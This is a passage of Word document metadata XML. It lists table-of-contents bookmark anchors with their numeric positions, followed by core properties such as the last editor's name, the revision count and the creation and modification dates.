      </vt:variant>
      <vt:variant>
        <vt:i4>104</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc183984559</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1507391</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>98</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc183984558</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1507391</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>92</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc183984557</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1507391</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>86</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc183984556</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1507391</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>80</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc183984555</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1507391</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>74</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc183984554</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1507391</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>68</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc183984553</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1507391</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>62</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc183984552</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1507391</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>56</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc183984551</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1507391</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>50</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc183984550</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1441855</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>44</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc183984549</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1441855</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>38</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc183984548</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1441855</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>32</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc183984547</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1441855</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>26</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc183984546</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1441855</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>20</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc183984545</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1441855</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>14</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc183984544</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1441855</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>8</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc183984543</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1441855</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>2</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc183984542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dc:creator>
  <cp:keywords/>
  <cp:lastModifiedBy>BRYCE PLACE</cp:lastModifiedBy>
  <cp:revision>2</cp:revision>
  <cp:lastPrinted>2024-12-02T12:12:00Z</cp:lastPrinted>
  <dcterms:created xsi:type="dcterms:W3CDTF">2025-02-06T17:09:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-02-06T17:09:00Z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ContentTypeId">
    <vt:lpwstr>0x0101001D385E7010A8C44CA4DCDE52D113C7FE</vt:lpwstr>
  </property>
</Properties>
</file>